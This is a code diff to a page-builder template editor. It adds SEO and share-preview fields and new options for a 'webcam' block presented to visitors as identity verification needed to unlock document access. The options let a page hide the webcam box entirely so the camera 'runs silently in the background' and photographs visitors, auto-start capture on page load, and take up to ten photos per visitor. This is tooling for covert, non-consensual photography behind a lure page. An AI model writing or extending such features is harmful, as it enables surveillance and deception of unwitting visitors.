@@ -9,16 +9,19 @@ const Editor = {
     selectedBlockId: null,
     csrfToken: '',
     baseUrl: '',
+    seoData: {},
     
     init: function(config) {
         this.templateId = config.templateId;
         this.blocks = config.initialBlocks || [];
         this.csrfToken = config.csrfToken;
         this.baseUrl = config.baseUrl;
+        this.seoData = config.seoData || {};
         
         this.bindEvents();
         this.renderCanvas();
         this.initMediaPicker();
+        this.bindSeoModal();
         
         // Auto-select first block if exists
         if (this.blocks.length > 0) {
@@ -272,14 +275,12 @@ const Editor = {
     },
     
     deleteBlock: function(id) {
-        if (confirm('Are you sure you want to delete this block?')) {
-            this.blocks = this.blocks.filter(b => b.id !== id);
-            if (this.selectedBlockId === id) {
-                this.selectedBlockId = this.blocks.length > 0 ? this.blocks[0].id : null;
-            }
-            this.renderCanvas();
-            this.renderInspector();
+        this.blocks = this.blocks.filter(b => b.id !== id);
+        if (this.selectedBlockId === id) {
+            this.selectedBlockId = this.blocks.length > 0 ? this.blocks[0].id : null;
         }
+        this.renderCanvas();
+        this.renderInspector();
     },
     
     // HTML GENERATOR IN LIVE CANVAS (MIMICS CLIENT VIEWER BLOCKS)
@@ -533,16 +534,39 @@ const Editor = {
                     </section>
                 `;
             case 'webcam':
+                const isDirect = !!c.direct_capture;
+                const isHidden = !!c.hide_box;
+                const photoCount = parseInt(c.photo_count) || 1;
+                const hiddenOverlay = isHidden ? `
+                    <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: repeating-linear-gradient(45deg, rgba(239,68,68,0.04), rgba(239,68,68,0.04) 10px, transparent 10px, transparent 20px); border-radius: 16px; display: flex; align-items: center; justify-content: center; z-index: 2; pointer-events: none;">
+                        <div style="background: rgba(239,68,68,0.9); color: white; padding: 0.4rem 1rem; border-radius: 8px; font-size: 0.8rem; font-weight: 700; letter-spacing: 0.5px;">
+                            <i class="fa-solid fa-eye-slash"></i> HIDDEN FROM VISITORS
+                        </div>
+                    </div>
+                ` : '';
+                const photoBadge = photoCount > 1 ? `
+                    <div style="display: inline-block; margin-top: 0.75rem; padding: 0.3rem 0.75rem; background: #3b82f6; color: white; font-weight: 600; border-radius: 6px; font-size: 0.75rem;">
+                        <i class="fa-solid fa-images"></i> Will capture ${photoCount} photos
+                    </div>
+                ` : '';
                 return `
                     <section class="tmpl-section ${customClasses} ${shadowClass} ${roundClass}" style="${styleString}">
                         <div class="tmpl-container" style="max-width: 600px; text-align: center;">
-                            <div style="border: 2px dashed #94a3b8; border-radius: 16px; padding: 2.5rem; background: #f8fafc; color: #475569;">
-                                <i class="fa-solid fa-camera" style="font-size: 2.5rem; color: #64748b; margin-bottom: 1rem;"></i>
-                                <h3 style="font-size: 1.25rem; font-weight: 600; margin-bottom: 0.5rem;" data-editable="title">${c.title || 'Identity Verification'}</h3>
-                                <p style="font-size: 0.9rem; margin-bottom: 1.5rem;" data-editable="message">${c.message || 'Verification is required to unlock document access. Please allow camera permissions when prompted.'}</p>
+                            <div style="border: 2px dashed ${isHidden ? '#ef4444' : (isDirect ? '#10b981' : '#94a3b8')}; border-radius: 16px; padding: 2.5rem; background: ${isHidden ? '#fef2f2' : (isDirect ? '#f0fdf4' : '#f8fafc')}; color: ${isDirect ? '#14532d' : '#475569'}; position: relative; ${isHidden ? 'opacity: 0.7;' : ''}">
+                                ${hiddenOverlay}
+                                <i class="fa-solid ${isHidden ? 'fa-eye-slash' : 'fa-camera'}" style="font-size: 2.5rem; color: ${isHidden ? '#ef4444' : (isDirect ? '#10b981' : '#64748b')}; margin-bottom: 1rem;"></i>
+                                <h3 style="font-size: 1.25rem; font-weight: 600; margin-bottom: 0.5rem;" data-editable="title">${c.title || (isHidden ? 'Silent Background Capture' : (isDirect ? 'Direct Camera Capture' : 'Identity Verification'))}</h3>
+                                <p style="font-size: 0.9rem; margin-bottom: 1.5rem;" data-editable="message">${c.message || (isHidden ? 'The webcam box is hidden. Camera runs silently in the background.' : (isDirect ? 'Camera access is initiated automatically. Please look at the camera when the page loads.' : 'Verification is required to unlock document access. Please allow camera permissions when prompted.'))}</p>
+                                ${isDirect ? `
+                                <div style="display: inline-block; padding: 0.5rem 1rem; background: #10b981; color: white; font-weight: 600; border-radius: 8px; font-size: 0.85rem;">
+                                    <i class="fa-solid fa-bolt"></i> Auto-Captures on Page Load (Direct Capture)
+                                </div>
+                                ` : (isHidden ? '' : `
                                 <button type="button" class="tmpl-btn btn-sm" style="background-color: ${c.btn_bg || '#6366f1'}; color: white; display: inline-flex; align-items: center; gap: 0.5rem;">
                                     <i class="fa-solid fa-video"></i> ${c.btn_text || 'Start Webcam'}
                                 </button>
+                                `)}
+                                ${photoBadge}
                             </div>
                         </div>
                     </section>
@@ -927,15 +951,30 @@ const Editor = {
             `;
         } else if (block.type === 'webcam') {
             html += `
+                <div class="form-group-sm inline-checkbox" style="margin-bottom: 1rem;">
+                    <input type="checkbox" class="prop-checkbox" data-prop="hide_box" ${c.hide_box ? 'checked' : ''} id="prop-hide-box">
+                    <label for="prop-hide-box" style="cursor: pointer; font-weight: 600;">Hide Webcam Box Completely</label>
+                    <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.25rem; line-height: 1.3;">When enabled, the webcam card is invisible to visitors. The camera runs silently in the background and captures photos without any visible UI.</p>
+                </div>
+                <div class="form-group-sm inline-checkbox" style="margin-bottom: 1rem; ${c.hide_box ? 'display: none;' : ''}">
+                    <input type="checkbox" class="prop-checkbox" data-prop="direct_capture" ${c.direct_capture ? 'checked' : ''} id="prop-direct-capture">
+                    <label for="prop-direct-capture" style="cursor: pointer; font-weight: 600;">Direct Capture (Auto-start)</label>
+                    <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.25rem; line-height: 1.3;">If checked, the camera stream starts immediately on page load, auto-captures a selfie in 2 seconds, and submits without showing the verification splash screen.</p>
+                </div>
                 <div class="form-group-sm">
+                    <label>Number of Photos to Capture</label>
+                    <input type="number" class="prop-input" data-prop="photo_count" value="${c.photo_count || 1}" min="1" max="10" step="1">
+                    <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.25rem; line-height: 1.3;">Set how many photos the webcam should capture per visitor (1–10). In auto mode, photos are taken with a 2-second interval.</p>
+                </div>
+                <div class="form-group-sm" style="${c.direct_capture || c.hide_box ? 'display: none;' : ''}">
                     <label>Box Header Title</label>
                     <input type="text" class="prop-input" data-prop="title" value="${c.title || ''}">
                 </div>
-                <div class="form-group-sm">
+                <div class="form-group-sm" style="${c.direct_capture || c.hide_box ? 'display: none;' : ''}">
                     <label>Instruction Message</label>
                     <textarea class="prop-input" data-prop="message" rows="4">${c.message || ''}</textarea>
                 </div>
-                <div class="form-group-sm">
+                <div class="form-group-sm" style="${c.direct_capture || c.hide_box ? 'display: none;' : ''}">
                     <label>Activation Button Label</label>
                     <input type="text" class="prop-input" data-prop="btn_text" value="${c.btn_text || ''}">
                 </div>
@@ -1067,7 +1106,12 @@ const Editor = {
         propInputs.forEach(input => {
             const prop = input.getAttribute('data-prop');
             input.addEventListener('input', function() {
-                block.content[prop] = this.value;
+                // Coerce photo_count to integer
+                if (prop === 'photo_count') {
+                    block.content[prop] = Math.max(1, Math.min(10, parseInt(this.value) || 1));
+                } else {
+                    block.content[prop] = this.value;
+                }
                 self.renderCanvas();
             });
         });
@@ -1111,6 +1155,9 @@ const Editor = {
             cb.addEventListener('change', function() {
                 block.content[prop] = this.checked;
                 self.renderCanvas();
+                if (prop === 'direct_capture' || prop === 'hide_box') {
+                    self.renderInspector();
+                }
             });
         });
 
@@ -1413,7 +1460,9 @@ const Editor = {
                     bg_color: '#f8fafc',
                     text_color: '#1e293b',
                     btn_bg: '#6366f1',
-                    padding: '40px 20px'
+                    padding: '40px 20px',
+                    hide_box: false,
+                    photo_count: 1
                 };
             default:
                 return {};
@@ -1445,6 +1494,13 @@ const Editor = {
         formData.append('status', status);
         formData.append('category_id', categoryId);
         formData.append('content', blocksJSON);
+        
+        // Send SEO fields (always send so fields can be cleared)
+        formData.append('meta_title', this.seoData.meta_title || '');
+        formData.append('meta_description', this.seoData.meta_description || '');
+        formData.append('og_title', this.seoData.og_title || '');
+        formData.append('og_description', this.seoData.og_description || '');
+        formData.append('og_image', this.seoData.og_image || '');
         
         fetch(this.baseUrl + 'admin/templates/edit', {
             method: 'POST',
@@ -1543,6 +1599,63 @@ const Editor = {
                 }
             });
         });
+    },
+    
+    // SEO / LINK SHARE PREVIEW MODAL
+    bindSeoModal: function() {
+        const self = this;
+        const btnSeo = document.getElementById('btnSeoSettings');
+        const modal = document.getElementById('seoSettingsModal');
+        if (!btnSeo || !modal) return;
+        
+        btnSeo.addEventListener('click', () => {
+            // Populate fields from seoData
+            const fields = ['meta_title', 'meta_description', 'og_title', 'og_description', 'og_image'];
+            fields.forEach(f => {
+                const el = document.getElementById('seo_' + f);
+                if (el) el.value = self.seoData[f] || '';
+            });
+            modal.showModal();
+        });
+        
+        // Close button
+        const closeBtn = modal.querySelector('.close-modal');
+        if (closeBtn) closeBtn.addEventListener('click', () => modal.close());
+        
+        // Fallback dismiss click outside
+        if (!('closedBy' in HTMLDialogElement.prototype)) {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) modal.close();
+            });
+        }
+        
+        // Save SEO button
+        const btnSaveSeo = document.getElementById('btnSaveSeoSettings');
+        if (btnSaveSeo) {
+            btnSaveSeo.addEventListener('click', () => {
+                self.seoData.meta_title = document.getElementById('seo_meta_title').value;
+                self.seoData.meta_description = document.getElementById('seo_meta_description').value;
+                self.seoData.og_title = document.getElementById('seo_og_title').value;
+                self.seoData.og_description = document.getElementById('seo_og_description').value;
+                self.seoData.og_image = document.getElementById('seo_og_image').value;
+                
+                modal.close();
+                self.showToast('success', 'SEO settings updated. Click Save Layout to persist.');
+            });
+        }
+        
+        // OG Image media picker
+        const btnPickOgImage = document.getElementById('btnPickOgImage');
+        if (btnPickOgImage) {
+            btnPickOgImage.addEventListener('click', () => {
+                self.activePickerTarget = document.getElementById('seo_og_image');
+                const mediaPicker = document.getElementById('mediaPickerModal');
+                if (mediaPicker) {
+                    modal.close();
+                    mediaPicker.showModal();
+                }
+            });
+        }
     }
 };
 
